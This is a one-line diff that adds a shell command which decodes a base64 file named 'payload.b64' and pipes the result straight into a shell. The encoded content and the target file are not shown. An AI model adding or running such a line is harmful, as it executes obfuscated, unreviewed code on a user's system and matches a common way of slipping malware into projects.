@@ -1,0 +1,1 @@
+base64 --decode payload.b64 | sh
